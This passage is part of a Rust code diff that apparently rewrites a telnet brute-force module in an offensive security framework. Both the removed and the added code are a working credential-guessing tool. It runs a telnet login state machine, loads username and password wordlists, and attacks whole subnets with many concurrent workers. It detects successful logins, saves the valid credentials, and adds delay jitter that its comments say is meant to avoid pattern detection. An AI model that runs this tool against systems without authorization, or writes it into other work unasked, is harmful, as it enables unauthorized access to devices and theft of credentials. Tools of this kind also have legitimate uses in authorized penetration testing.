-                                 if password.is_empty() { "(blank)" } else { password });
-                    }
-                }
-                Err(e) => {
-                    error_attempts += 1;
-                    let error_type = classify_telnet_error(&e.to_string());
-                    if verbose {
-                        println!("\r  [{}/{}] {} Error ({}): {}",
-                                 cred_idx + 1,
-                                 DEFAULT_CREDENTIALS.len(),
-                                 "!".yellow(),
-                                 error_type,
-                                 e);
-                    } else {
-                        println!("  {} Error: {}", "!".yellow(), e);
-                    }
-                    // Don't break on error in verbose mode - continue testing
-                    if !verbose {
-                        break;
-                    }
-                }
-            }
-            sleep(Duration::from_millis(200)).await;
-        }
-        println!();
+            },
+        )
+        .await;
     }
 
-    // Print summary
-    if verbose {
-        println!("{}", "=== Quick Check Summary ===".bold().cyan());
-        println!("  Total attempts:    {}", total_attempts);
-        println!("  Successful:       {}", successful_attempts.to_string().green().bold());
-        println!("  Failed:           {}", failed_attempts);
-        println!("  Errors:           {}", error_attempts.to_string().yellow());
-        if total_attempts > 0 {
-            let success_rate = (successful_attempts as f64 / total_attempts as f64) * 100.0;
-            println!("  Success rate:     {:.1}%", success_rate);
-        }
-        println!();
-    }
+    // --- Subnet Scan Mode ---
+    if is_subnet_target(target) {
+        let port: u16 = cfg_prompt_port("port", "Telnet Port", DEFAULT_TELNET_PORT).await?;
 
-    if !found_any {
-        println!("{}", "[-] No valid credentials found".yellow());
-    } else {
-        println!("{}", format!("[+] Found {} valid credential(s)", results.len()).green().bold());
-        if verbose {
-            println!("  Valid credentials:");
-            for result in &results {
-                println!("    - {}", result);
-            }
-            println!();
+        let usernames_file =
+            cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
+        let passwords_file =
+            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
+        let users = load_lines(&usernames_file)?;
+        let passes = load_lines(&passwords_file)?;
+        if users.is_empty() {
+            return Err(anyhow!("User list empty"));
+        }
+        if passes.is_empty() {
+            return Err(anyhow!("Pass list empty"));
         }
 
-        if prompt_yes_no("Save results to file? (y/n): ", true)? {
-            let output_path = prompt_required("Output file path: ")?;
-            save_quick_check_results(&output_path, &results).await?;
-            println!("[+] Results saved to '{}'", output_path);
-        }
-    }
+        let concurrency: usize = {
+            let input = cfg_prompt_default("concurrency", "Max concurrent hosts", "10").await?;
+            input.parse::<usize>().unwrap_or(10).max(1).min(256)
+        };
+        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+        let output_file = cfg_prompt_output_file(
+            "output_file",
+            "Output result file",
+            "telnet_subnet_results.txt",
+        )
+        .await?;
 
-    Ok(())
-}
-
-async fn save_quick_check_results(path: &str, results: &[String]) -> Result<()> {
-    let mut f = File::create(path).await?;
-    f.write_all(b"# Quick Check Results\n").await?;
-    f.write_all(format!("# Date: {}\n\n", chrono::Local::now()).as_bytes()).await?;
-    for result in results {
-        f.write_all(format!("{}\n", result).as_bytes()).await?;
-    }
-    f.flush().await?;
-    Ok(())
-}
-
-// src/modules/creds/generic/telnet_bruteforce.rs - PART 2/4
-// Core Login Functions and Execution Logic
-
-// ============================================================
-// CORE TELNET LOGIN FUNCTIONS
-// ============================================================
-
-#[derive(Debug, PartialEq, Clone, Copy)]
-enum TelnetState {
-    WaitingForBanner,
-    WaitingForLoginPrompt,
-    SendingUsername,
-    WaitingForPasswordPrompt,
-    SendingPassword,
-    WaitingForResult,
-}
-
-#[inline]
-async fn try_telnet_login(
-    socket: &SocketAddr,
-    username: &str,
-    password: &str,
-    config: &TelnetBruteforceConfig,
-) -> Result<bool> {
-    // Attempt 1: Standard
-    let (success, banner_seen) = do_telnet_login(socket, username, password, config, false).await?;
-    if success {
-        return Ok(true);
-    }
-
-    // If failed and no banner seen (blind), retry blind pass only
-    if !banner_seen {
-        let (success_retry, _) = do_telnet_login(socket, username, password, config, true).await?;
-        if success_retry {
-            return Ok(true);
-        }
-    }
-
-    Ok(false)
-}
-
-async fn do_telnet_login(
-    socket: &SocketAddr,
-    username: &str,
-    password: &str,
-    config: &TelnetBruteforceConfig,
-    force_password_only: bool,
-) -> Result<(bool, bool)> {
-    let stream = timeout(
-        Duration::from_secs(config.connection_timeout),
-                         TcpStream::connect(socket),
-    )
-    .await
-    .map_err(|_| anyhow!("Connection timeout"))?
-    .map_err(|e| {
-        let error_msg = format!("{}", e);
-        let error_type = classify_telnet_error(&error_msg);
-        anyhow!("{}: {}", error_type, e)
-    })?;
-
-    let (reader, mut writer) = tokio::io::split(stream);
-    let mut reader = BufReader::with_capacity(BUFFER_SIZE, reader);
-    let mut buf = bytes::BytesMut::with_capacity(BUFFER_SIZE);
-    let mut response_after_pass = String::with_capacity(RESPONSE_BUFFER_CAPACITY);
-    let mut recent_buffer = String::with_capacity(2048); // Track recent output regardless of state
-    let mut banner_detected = false;
-
-    let mut state = TelnetState::WaitingForBanner;
-    let start_time = Instant::now();
-    let max_duration = Duration::from_secs(config.connection_timeout +
-    config.login_prompt_timeout +
-    config.password_prompt_timeout +
-    config.auth_response_timeout + 5);
-
-    loop {
-        if start_time.elapsed() > max_duration {
-            return Err(anyhow!("Total operation timeout"));
-        }
-
-        // --- READ PHASE ---
-        // Dynamically adjust timeout based on state
-        let current_timeout = match state {
-            TelnetState::WaitingForBanner => Duration::from_secs(config.banner_read_timeout),
-            TelnetState::WaitingForLoginPrompt => Duration::from_secs(config.login_prompt_timeout),
-            TelnetState::WaitingForPasswordPrompt => Duration::from_secs(config.password_prompt_timeout),
-            TelnetState::WaitingForResult => Duration::from_secs(config.auth_response_timeout),
-            _ => Duration::from_millis(100), // Short timeout for sending states
+        let connection_timeout: u64 = {
+            let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "8").await?;
+            input
+                .parse::<u64>()
+                .unwrap_or(CONNECT_TIMEOUT_SECS)
+                .max(1)
+                .min(60)
         };
 
-        // If we need to read
-        let need_read = match state {
-            TelnetState::SendingUsername | TelnetState::SendingPassword => false,
-            _ => true
+        let cfg = Arc::new(TelnetConfig::new(connection_timeout, READ_TIMEOUT_SECS));
+
+        return run_subnet_bruteforce(
+            target,
+            port,
+            users,
+            passes,
+            &SubnetScanConfig {
+                concurrency,
+                verbose,
+                output_file,
+                service_name: "telnet",
+                source_module: "creds/generic/telnet_bruteforce",
+                skip_tcp_check: false,
+            },
+            move |ip: IpAddr, port: u16, user: String, pass: String| {
+                let cfg = cfg.clone();
+                async move {
+                    let addr = format!("{}:{}", ip, port);
+                    match try_telnet_login(&addr, &user, &pass, &cfg).await {
+                        Ok(true) => LoginResult::Success,
+                        Ok(false) => LoginResult::AuthFailed,
+                        Err(e) => {
+                            let msg = e.to_string();
+                            LoginResult::Error {
+                                message: msg.clone(),
+                                retryable: is_retryable_error(&msg),
+                            }
+                        }
+                    }
+                }
+            },
+        )
+        .await;
+    }
+
+    // --- Single Target Mode ---
+    let ports = parse_ports(
+        &cfg_prompt_default("port", "Telnet port(s) (comma-separated)", "23,2323").await?,
+    );
+    if ports.is_empty() {
+        return Err(anyhow!("No valid ports specified"));
+    }
+
+    let use_defaults =
+        cfg_prompt_yes_no("use_defaults", "Try default credentials first?", true).await?;
+
+    let usernames_file =
+        if cfg_prompt_yes_no("use_username_wordlist", "Use username wordlist?", true).await? {
+            Some(cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?)
+        } else {
+            None
         };
 
-        if need_read {
-            let buf_len_before = buf.len();
-            let read_result = timeout(current_timeout, reader.read_buf(&mut buf)).await;
+    let passwords_file =
+        if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true).await? {
+            Some(cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?)
+        } else {
+            None
+        };
 
-            match read_result {
-                Ok(Ok(0)) => {
-                    // EOF handling
-                    match state {
-                        TelnetState::WaitingForResult => {
-                            // If we already sent password and got EOF, maybe it's a success closed loop (rare but happens)
-                            // or a failure closed loop. Check buffer.
-                            if has_success_indicators(&response_after_pass) {
-                                return Ok((true, banner_detected));
-                            }
-                            // Check for clean close
-                            match classify_eof(&response_after_pass, true, true, 1) {
-                                EofType::CleanClose => return Ok((false, banner_detected)), // Failed auth usually closes cleanly
-                                _ => return Ok((false, banner_detected))
-                            }
-                        },
-                        _ => return Err(anyhow!("Unexpected EOF in state {:?}", state))
-                    }
-                }
-                Ok(Ok(_)) => {
-                    // Extract new data
-                    let new_data = if buf_len_before <= buf.len() {
-                        buf.split_off(buf_len_before)
-                    } else {
-                        buf.split_off(0)
-                    };
-
-                    // Handle IAC
-                    let (clean_bytes, iac_responses) = process_telnet_iac(&new_data);
-
-                    if !iac_responses.is_empty() {
-                        let _ = timeout(Duration::from_millis(config.write_timeout), writer.write_all(&iac_responses)).await;
-                    }
-
-                    let output = String::from_utf8_lossy(&clean_bytes).to_string();
-                    let clean_output = strip_ansi_escape_sequences(&output);
-                    let lower = clean_output.to_lowercase();
-
-                    // Append to recent buffer for prompt matching (keep size sane)
-                    recent_buffer.push_str(&lower);
-                    if recent_buffer.len() > 2048 {
-                        let split_idx = recent_buffer.len() - 1024;
-                        recent_buffer = recent_buffer[split_idx..].to_string();
-                    }
-
-                    // If waiting for result, accumulate
-                    if state == TelnetState::WaitingForResult {
-                        if response_after_pass.len() + output.len() <= RESPONSE_BUFFER_CAPACITY {
-                            response_after_pass.push_str(&output);
-                        }
-                    }
-                }
-                Ok(Err(e)) => {
-                    if is_connection_error(&e) {
-                        return Err(anyhow!("Connection error during read: {}", e));
-                    }
-                    return Err(anyhow!("Read error: {}", e));
-                },
-                Err(_) => {
-                    // Timeout
-                    // If we are waiting for result and timed out, check if we have enough info
-                    if state == TelnetState::WaitingForResult {
-                        // Check if we have success indicators even if timed out
-                        if has_success_indicators(&response_after_pass) {
-                            return Ok((true, banner_detected));
-                        }
-                        // If we have failure indicators
-                        for indicator in &config.failure_indicators_lower {
-                            if response_after_pass.to_lowercase().contains(indicator) {
-                                return Ok((false, banner_detected));
-                            }
-                        }
-                        // Fallback logic for timeout
-                        return Ok((false, banner_detected));
-                    }
-
-                    // Timeout in Banner/Login wait -> Blind Injection?
-                    if state == TelnetState::WaitingForBanner {
-                        // If we timed out waiting for banner, assume no banner seen.
-                        // Based on force_password_only, we jump state.
-                        if force_password_only {
-                            state = TelnetState::SendingPassword;
-                        } else {
-                            state = TelnetState::SendingUsername;
-                        }
-                        continue;
-                    }
-
-                    if state == TelnetState::WaitingForLoginPrompt {
-                        // similar blind injection if we timed out waiting specifically for prompt
-                        if force_password_only {
-                            state = TelnetState::SendingPassword;
-                        } else {
-                            state = TelnetState::SendingUsername;
-                        }
-                        continue;
-                    }
-                }
-            }
-        }
-
-        // --- STATE TRANSITION PHASE ---
-        match state {
-            TelnetState::WaitingForBanner => {
-                // Check for password prompt first (password-only auth)
-                let found_pass_prompt = config.password_prompts_lower.iter().any(|p| recent_buffer.contains(p));
-                if found_pass_prompt {
-                    banner_detected = true;
-                    state = TelnetState::SendingPassword;
-                } else {
-                    // Check for login prompt
-                    let found_login_prompt = config.login_prompts_lower.iter().any(|p| recent_buffer.contains(p));
-                    if found_login_prompt {
-                        banner_detected = true;
-                        state = TelnetState::SendingUsername;
-                    } else {
-                        // Move to waiting for prompt explicitly
-                        state = TelnetState::WaitingForLoginPrompt;
-                    }
-                }
-            }
-            TelnetState::WaitingForLoginPrompt => {
-                // Also check for password prompt here just in case
-                let found_pass_prompt = config.password_prompts_lower.iter().any(|p| recent_buffer.contains(p));
-                if found_pass_prompt {
-                    state = TelnetState::SendingPassword;
-                } else {
-                    let found_login_prompt = config.login_prompts_lower.iter().any(|p| recent_buffer.contains(p));
-                    if found_login_prompt {
-                        state = TelnetState::SendingUsername;
-                    }
-                }
-                // If we read data but didn't match, loop again (implicit continue)
-            }
-            TelnetState::SendingUsername => {
-                let login_data = format!("{}\r\n", username);
-                timeout(Duration::from_millis(config.write_timeout), writer.write_all(login_data.as_bytes())).await??;
-                // Clear buffers to avoid matching old prompts
-                recent_buffer.clear();
-                buf.clear();
-                tokio::time::sleep(Duration::from_secs(2)).await;
-                state = TelnetState::WaitingForPasswordPrompt;
-            }
-            TelnetState::WaitingForPasswordPrompt => {
-                let found_pass_prompt = config.password_prompts_lower.iter().any(|p| recent_buffer.contains(p));
-                if found_pass_prompt {
-                    state = TelnetState::SendingPassword;
-                }
-                // If we see a login prompt again, it means username was rejected or something looped
-                if config.login_prompts_lower.iter().any(|p| recent_buffer.contains(p)) {
-                    return Ok((false, banner_detected)); // Assume failed user
-                }
-            }
-            TelnetState::SendingPassword => {
-                let pass_data = format!("{}\r\n", password);
-                timeout(Duration::from_millis(config.write_timeout), writer.write_all(pass_data.as_bytes())).await??;
-                recent_buffer.clear();
-                buf.clear();
-                state = TelnetState::WaitingForResult;
-            }
-            TelnetState::WaitingForResult => {
-                // Check success
-                if has_success_indicators(&response_after_pass) {
-                    return Ok((true, banner_detected));
-                }
-                for indicator in &config.success_indicators_lower {
-                    if recent_buffer.contains(indicator) {
-                        return Ok((true, banner_detected));
-                    }
-                }
-
-                // Check failure
-                for indicator in &config.failure_indicators_lower {
-                    if recent_buffer.contains(indicator) {
-                        return Ok((false, banner_detected));
-                    }
-                }
-
-                // Check if it asks for login again (loopback)
-                if config.login_prompts_lower.iter().any(|p| recent_buffer.contains(p)) {
-                    return Ok((false, banner_detected));
-                }
-            }
-        }
-    }
-}
-
-async fn try_telnet_login_simple(
-    ip: &str,
-    port: u16,
-    username: &str,
-    password: &str,
-    timeout_secs: u64,
-) -> Result<bool> {
-    let addr = format!("{}:{}", ip, port);
-    // Use async lookup_host
-    let socket = lookup_host(&addr).await?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;
-
-    let mut stream = timeout(
-        Duration::from_secs(timeout_secs),
-                             TcpStream::connect(socket)
-    )
-    .await??;
-
-    let mut buffer = vec![0u8; 1024];
-
-    // Read initial prompt
-    timeout(Duration::from_secs(2), stream.read(&mut buffer)).await.ok();
-
-    // Send username
-    stream.write_all(format!("{}\n", username).as_bytes()).await?;
-    stream.flush().await?;
-    sleep(Duration::from_millis(300)).await;
-
-    // Wait for password prompt
-    timeout(Duration::from_secs(2), stream.read(&mut buffer)).await.ok();
-
-    // Send password
-    stream.write_all(format!("{}\n", password).as_bytes()).await?;
-    stream.flush().await?;
-    sleep(Duration::from_millis(500)).await;
-
-    // Read response
-    let n = match timeout(Duration::from_secs(2), stream.read(&mut buffer)).await {
-        Ok(Ok(n)) => n,
-        _ => return Ok(false),
-    };
-
-    let response = String::from_utf8_lossy(&buffer[..n]).to_lowercase();
-
-    let success = ["#", "$", ">", "welcome", "last login"]
-    .iter()
-    .any(|indicator| response.contains(indicator));
-
-    let failure = ["incorrect", "failed", "denied", "invalid"]
-    .iter()
-    .any(|indicator| response.contains(indicator));
-
-    Ok(success && !failure)
-}
-
-// ============================================================
-// BRUTEFORCE EXECUTION
-// ============================================================
-
-async fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
-    let target_str = crate::utils::normalize_target(&config.target)?;
-    let addr_str = if target_str.contains(':') {
-        target_str
-    } else {
-        format!("{}:{}", target_str, config.port)
-    };
-
-    // Resolve DNS once here
-    let socket_addr = lookup_host(&addr_str).await?.next().context("Unable to resolve target")?;
-
-    println!("[*] Target resolved to: {}", socket_addr);
-
-    if config.pre_validate {
-        println!("[*] Validating target is Telnet service...");
-        match validate_telnet_target(&addr_str, &config).await {
-            Ok(_) => println!("{}", "[+] Target validation successful".green()),
-            Err(e) => {
-                eprintln!("{}", format!("[!] Warning: {}", e).yellow());
-                if !prompt_yes_no("Continue anyway? (y/n): ", false)? {
-                    return Err(anyhow!("Target validation failed"));
-                }
-            }
-        }
+    if !use_defaults && usernames_file.is_none() && passwords_file.is_none() {
+        return Err(anyhow!(
+            "At least one wordlist or default credentials must be enabled"
+        ));
     }
 
-    let username_size = tokio::fs::metadata(&config.username_wordlist).await?.len();
-    let password_size = if let Some(ref path) = config.password_wordlist {
-        tokio::fs::metadata(path).await?.len()
+    let concurrency: usize = {
+        let input = cfg_prompt_default("concurrency", "Max concurrent tasks", "10").await?;
+        input.parse::<usize>().unwrap_or(10).max(1).min(256)
+    };
+
+    let connection_timeout: u64 = {
+        let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "8").await?;
+        input
+            .parse::<u64>()
+            .unwrap_or(CONNECT_TIMEOUT_SECS)
+            .max(1)
+            .min(60)
+    };
+
+    let retry_on_error =
+        cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true).await?;
+    let max_retries: usize = if retry_on_error {
+        let input = cfg_prompt_default("max_retries", "Max retries per attempt", "2").await?;
+        input.parse::<usize>().unwrap_or(2).max(1).min(10)
     } else {
         0
     };
 
-    let total_size = username_size + password_size;
-    let use_streaming = should_use_streaming(total_size).await?;
-
-    let (usernames, passwords, username_count, password_count) = if use_streaming {
-        load_wordlists_streaming(&config).await?
-    } else {
-        load_wordlists_memory(&config).await?
-    };
-
-    println!("[*] Loaded {} username(s)", username_count);
-    if password_count > 0 {
-        println!("[*] Loaded {} password(s)", password_count);
-    }
-
-    let estimated_total = calculate_estimated_attempts(&config, username_count, password_count);
-    println!("[*] Estimated total attempts: {}", estimated_total);
-    println!();
-
-    let output_file = Arc::new(config.output_file.clone());
-    initialize_output_file(&output_file, &config).await?;
-
-    // Create buffered result writer for efficient I/O
-    let result_writer = Arc::new(Mutex::new(BufferedResultWriter::new(&output_file).await?));
-
-    let found_creds = Arc::new(Mutex::new(HashSet::new()));
-    let stop_flag = Arc::new(AtomicBool::new(false));
-    let stats = Arc::new(Statistics::new());
-
-    let channel_buffer = config.threads * CHANNEL_BUFFER_MULTIPLIER;
-    let (tx, rx) = mpsc::channel::<(Arc<str>, Arc<str>)>(channel_buffer);
-
-    spawn_producers(
-        &config,
-        tx,
-        use_streaming,
-        &usernames,
-        &passwords,
-        username_count,
-        password_count,
-        stop_flag.clone(),
-    );
-
-    // Use standard Tokio semaphore
-    let semaphore = Arc::new(Semaphore::new(config.threads));
-    let rx = Arc::new(Mutex::new(rx));
-    let mut worker_handles = Vec::with_capacity(config.threads);
-
-    for worker_id in 0..config.threads {
-        let h = spawn_worker(
-            worker_id,
-            rx.clone(),
-                             socket_addr,
-                             stop_flag.clone(),
-                             found_creds.clone(),
-                             result_writer.clone(),
-                             config.clone(),
-                             stats.clone(),
-                             semaphore.clone(),
-        );
-        worker_handles.push(h);
-    }
-
-    let progress_handle = spawn_progress_reporter(stats.clone(), stop_flag.clone());
-
-    for (i, h) in worker_handles.into_iter().enumerate() {
-        if let Err(e) = h.await {
-            eprintln!("[!] Worker {} failed: {}", i, e);
-        }
-    }
-
-    stop_flag.store(true, Ordering::Relaxed);
-    let _ = progress_handle.await;
-
-    // Finalize buffered result writer to ensure all data is written
-    if let Err(e) = result_writer.lock().await.finalize().await {
-        eprintln!("[!] Failed to finalize result writer: {}", e);
-    }
-
-    stats.print_final().await;
-    print_final_report(&found_creds, &output_file).await;
-
-    Ok(())
-}
-
-// ============================================================
-// BATCH SCANNER EXECUTION
-// ============================================================
-
-async fn execute_batch_scan(config: BatchScanConfig) -> Result<()> {
-    let semaphore = Arc::new(tokio::sync::Semaphore::new(config.max_concurrent));
-    let mut tasks = Vec::new();
-
-    println!("Starting scan with {} concurrent tasks...", config.max_concurrent);
-    println!();
-
-    for target in config.targets.clone() {
-        let sem = semaphore.clone();
-        let cfg = config.clone();
-
-        let task = tokio::spawn(async move {
-            let _permit = match sem.acquire().await {
-                Ok(permit) => permit,
-                Err(_) => {
-                    eprintln!("[!] Semaphore closed, skipping target");
-                    return Vec::new();
-                }
-            };
-            scan_target(target, &cfg).await
-        });
-
-        tasks.push(task);
-    }
-
-    let mut all_results = Vec::new();
-    let mut open_ports = 0;
-    let mut valid_creds = 0;
-
-    for task in tasks {
-        match task.await {
-            Ok(results) => {
-                open_ports += results.len();
-                valid_creds += results.iter().filter(|r| r.credentials.is_some()).count();
-                all_results.extend(results);
-            }
-            Err(e) => {
-                println!("{} Task error: {}", "[!]".red(), e);
-            }
-        }
-    }
-
-    println!();
-    save_batch_results(&all_results, &config.output_file)?;
-
-    println!();
-    println!("{}", "=== Scan Summary ===".bright_blue().bold());
-    println!("Targets scanned:       {}", config.targets.len());
-    println!("Open telnet ports:     {}", open_ports);
-    println!("Valid credentials:     {} {}", valid_creds,
-             if valid_creds > 0 { "✓".green() } else { "✗".red() });
-    println!("Results saved to:      {}", config.output_file);
-
-    if valid_creds > 0 {
-        println!();
-        println!("{}", "Valid credentials found:".bright_green().bold());
-        for result in &all_results {
-            if let Some((u, p)) = &result.credentials {
-                println!("  • {}:{} - {}/{}", result.ip, result.port, u,
-                         if p.is_empty() { "(blank)" } else { p });
-            }
-        }
-    }
-
-    Ok(())
-}
-
-async fn scan_target(ip: String, config: &BatchScanConfig) -> Vec<ScanResult> {
-    let mut results = Vec::new();
-
-    for &port in &config.ports {
-        if config.verbose {
-            println!("{} Scanning {}:{}...", "[*]".cyan(), ip, port);
-        }
-
-        let banner = match check_port(&ip, port, config.timeout).await {
-            Ok(Some(b)) => b,
-            _ => {
-                if config.verbose {
-                    println!("  {} Port closed", "[✗]".red());
-                }
-                continue;
-            }
-        };
-
-        println!("{} {}:{} - Port open", "[+]".green(), ip, port);
-
-        if config.verbose && !banner.is_empty() {
-            println!("  [*] Banner: {}", banner.trim());
-        }
-
-        let mut found_creds = None;
-
-        for (username, password) in &config.credentials {
-            if config.verbose {
-                println!("  [*] Trying {}/{}", username,
-                         if password.is_empty() { "(blank)" } else { password });
-            }
-
-            match try_telnet_login_simple(&ip, port, username, password,
-                                          config.timeout.as_secs()).await {
-                                              Ok(true) => {
-                                                  println!(
-                                                      "{} {}:{} - Valid: {}/{}",
-                                                      "[✓]".bright_green().bold(),
-                                                           ip, port, username,
-                                                           if password.is_empty() { "(blank)" } else { password }
-                                                  );
-                                                  found_creds = Some((username.clone(), password.clone()));
-                                                  break;
-                                              }
-                                              Ok(false) => {
-                                                  if config.verbose {
-                                                      println!("  {} Invalid", "[✗]".red());
-                                                  }
-                                              }
-                                              Err(e) => {
-                                                  if config.verbose {
-                                                      println!("  {} Error: {}", "[!]".yellow(), e);
-                                                  }
-                                              }
-                                          }
-
-                                          sleep(Duration::from_millis(100)).await;
-        }
-
-        results.push(ScanResult {
-            ip: ip.clone(),
-                     port,
-                     banner: banner.trim().to_string(),
-                     credentials: found_creds,
-                     timestamp: chrono::Utc::now().to_rfc3339(),
-        });
-    }
-
-    results
-}
-
-async fn check_port(ip: &str, port: u16, timeout_duration: Duration) -> Result<Option<String>> {
-    let addr = format!("{}:{}", ip, port);
-    let socket: SocketAddr = addr.parse()?;
-
-    let stream = match timeout(timeout_duration, TcpStream::connect(&socket)).await {
-        Ok(Ok(s)) => s,
-        _ => return Ok(None),
-    };
-
-    let mut stream = stream;
-    let mut buffer = vec![0u8; 512];
-
-    let banner = match timeout(Duration::from_secs(2), stream.read(&mut buffer)).await {
-        Ok(Ok(n)) if n > 0 => String::from_utf8_lossy(&buffer[..n]).to_string(),
-        _ => String::new(),
-    };
-
-    Ok(Some(banner))
-}
-
-// ============================================================
-// WORKER AND PRODUCER FUNCTIONS
-// ============================================================
-
-// ResourceAwareSemaphore removed in favor of standard Tokio Semaphore
-// for simplicity and reliability.
-
-fn spawn_worker(
-    worker_id: usize,
-    rx: Arc<Mutex<mpsc::Receiver<(Arc<str>, Arc<str>)>>>,
-                socket_addr: SocketAddr,
-                stop_flag: Arc<AtomicBool>,
-                found_creds: Arc<Mutex<HashSet<(String, String)>>>,
-                result_writer: Arc<Mutex<BufferedResultWriter>>,
-                config: TelnetBruteforceConfig,
-                stats: Arc<Statistics>,
-                semaphore: Arc<Semaphore>,
-) -> tokio::task::JoinHandle<()> {
-    tokio::spawn(async move {
-        loop {
-            if stop_flag.load(Ordering::SeqCst) {
-                if config.verbose {
-                    println!("[*] Worker {} stopping (stop flag set)", worker_id);
-                }
-                break;
-            }
-
-            let pair = loop {
-                // Try to receive message
-                let recv_result = {
-                    let mut guard = rx.lock().await;
-                    guard.try_recv()
-                };
-
-                match recv_result {
-                    Ok(p) => break Some(p),
-                 Err(mpsc::error::TryRecvError::Empty) => {
-                     // No message available, wait a bit before trying again
-                     // But release the lock first to prevent deadlock
-                     sleep(Duration::from_millis(10)).await;
-
-                     // Check stop flag after sleep
-                     if stop_flag.load(Ordering::SeqCst) {
-                         break None;
-                     }
-                     continue;
-                 }
-                 Err(mpsc::error::TryRecvError::Disconnected) => break None,
-                }
-            };
-
-            let Some((user, pass)) = pair else {
-                if config.verbose {
-                    println!("[*] Worker {} stopping (channel closed)", worker_id);
-                }
-                break;
-            };
-
-            // DNS resolution is now done once before spawning workers
-            let socket = socket_addr;
-
-            // Atomically check stop flag and acquire permit to prevent race condition
-            let _permit = match semaphore.acquire().await {
-                Ok(permit) => permit,
-                 Err(_) => {
-                     eprintln!("[!] Worker {} failed to acquire semaphore permit", worker_id);
-                     break;
-                 }
-            };
-
-            // Check stop flag after acquiring permit but before starting work
-            if stop_flag.load(Ordering::SeqCst) {
-                if config.verbose {
-                    println!(
-                        "[*] Worker {} dropping work {}:{} (stopped)",
-                             worker_id,
-                             sanitize_input(user.as_ref()),
-                             sanitize_input(pass.as_ref())
-                    );
-                }
-                drop(_permit); // Explicitly drop permit to release it
-                break;
-            }
-
-            if stop_flag.load(Ordering::SeqCst) {
-                if config.verbose {
-                    println!(
-                        "[*] Worker {} aborting attempt {}:{} (stopped)",
-                             worker_id,
-                             sanitize_input(user.as_ref()),
-                             sanitize_input(pass.as_ref())
-                    );
-                }
-                break;
-            }
-
-            if config.verbose {
-                println!(
-                    "{} [Worker {}] Trying {}:{}",
-                    "[*]".bright_blue(),
-                         worker_id,
-                         sanitize_input(user.as_ref()),
-                         sanitize_input(pass.as_ref())
-                );
-            }
-
-            // Watchdog around the full login attempt
-            let attempt_future = try_telnet_login(&socket, &user, &pass, &config);
-            let mut attempt_result = match timeout(Duration::from_secs(TASK_WATCHDOG_TIMEOUT_SECS), attempt_future).await {
-                Ok(res) => res,
-                 Err(_) => {
-                     // Don't count as regular attempt since it never completed
-                     stats.record_hung_task();
-                     stats.record_error_kind("Task watchdog timeout").await;
-                     if config.verbose {
-                         eprintln!(
-                             "{}",
-                             format!(
-                                 "[!] Worker {}: attempt {}:{} hung (watchdog timeout)",
-                                     worker_id, user, pass
-                             )
-                                 .yellow()
-                         );
-                     }
-                     continue;
-                 }
-            };
-
-            let mut retry_count = 0;
-            while config.retry_on_error && retry_count < config.max_retries && attempt_result.is_err() {
-                if stop_flag.load(Ordering::SeqCst) {
-                    break;
-                }
-
-                retry_count += 1;
-                stats.record_retry();
-                stats.record_retry_queued();
-
-                // Exponential backoff with jitter to avoid pattern detection
-                let base_delay = config.delay_ms;
-                let backoff_multiplier = (1u64 << retry_count).min(8); // Cap at 8x
-                let backoff_delay = base_delay * backoff_multiplier;
-
-                // Add jitter: randomize between 0% and 50% of the delay
-                let jitter_range = backoff_delay / 2;
-                let jitter = rand::rng().random_range(0..=jitter_range);
-                let total_delay = backoff_delay + jitter;
-
-                sleep(Duration::from_millis(total_delay)).await;
-                let retry_future = try_telnet_login(&socket, &user, &pass, &config);
-                attempt_result = match timeout(Duration::from_secs(TASK_WATCHDOG_TIMEOUT_SECS), retry_future).await {
-                    Ok(res) => res,
-                 Err(_) => {
-                     // Don't count as regular attempt since it never completed
-                     stats.record_hung_task();
-                     stats.record_error_kind("Task watchdog timeout").await;
-                     if config.verbose {
-                         eprintln!(
-                             "{}",
-                             format!(
-                                 "[!] Worker {}: retry attempt {}:{} hung (watchdog timeout)",
-                                     worker_id, user, pass
-                             )
-                                 .yellow()
-                         );
-                     }
-                     break;
-                 }
-                };
-            }
-
-            match attempt_result {
-                Ok(true) => {
-                    stats.record_attempt(true, false);
-
-                    let mut creds = found_creds.lock().await;
-                    if creds.insert((user.to_string(), pass.to_string())) {
-                        drop(creds);
-
-                        println!(
-                            "\n{}",
-                            format!(
-                                "[+] VALID: {}:{}",
-                                sanitize_input(user.as_ref()),
-                                    sanitize_input(pass.as_ref())
-                            )
-                                .green()
-                                .bold()
-                        );
-
-                        if let Err(e) = result_writer.lock().await.write_result(&user, &pass).await {
-                            eprintln!("[!] Failed to write result: {}", e);
-                        }
-
-                        if config.stop_on_success {
-                            stop_flag.store(true, Ordering::SeqCst);
-
-                            let mut rx_guard = rx.lock().await;
-                            let mut drained = 0;
-                            while rx_guard.try_recv().is_ok() {
-                                drained += 1;
-                            }
-                            drop(rx_guard);
-
-                            if config.verbose && drained > 0 {
-                                println!("[*] Worker {} drained {} queued attempts", worker_id, drained);
-                            }
-
-                            println!("[*] Worker {} stopping (success, stop_on_success=true)", worker_id);
-                            break;
-                        }
-                    }
-                }
-                Ok(false) => {
-                    stats.record_attempt(false, false);
-                    if config.verbose {
-                        println!(
-                            "{} Failed: {}:{}",
-                            "[-]".red(),
-                                 sanitize_input(user.as_ref()),
-                                 sanitize_input(pass.as_ref())
-                        );
-                    }
-                }
-                Err(e) => {
-                    stats.record_attempt(false, true);
-                    let msg = e.to_string();
-                    let kind = classify_telnet_error(&msg);
-                    match kind {
-                        "Read/Connection timeout" => stats.record_timeout(),
-                 "Broken pipe" => stats.record_broken_pipe(),
-                 _ => {}
-                    }
-                    stats.record_error_kind(kind).await;
-                    if config.verbose {
-                        eprintln!(
-                            "{} Error ({}): {}:{}",
-                                  "[!]".yellow(),
-                                  msg,
-                                  sanitize_input(user.as_ref()),
-                                  sanitize_input(pass.as_ref())
-                        );
-                    }
-                }
-            }
-
-            if config.delay_ms > 0 {
-                // Add jitter to avoid pattern detection: randomize between 75% and 125% of base delay
-                let base_delay = config.delay_ms;
-                let jitter_range = base_delay / 4; // 25% variation
-                let min_delay = base_delay.saturating_sub(jitter_range);
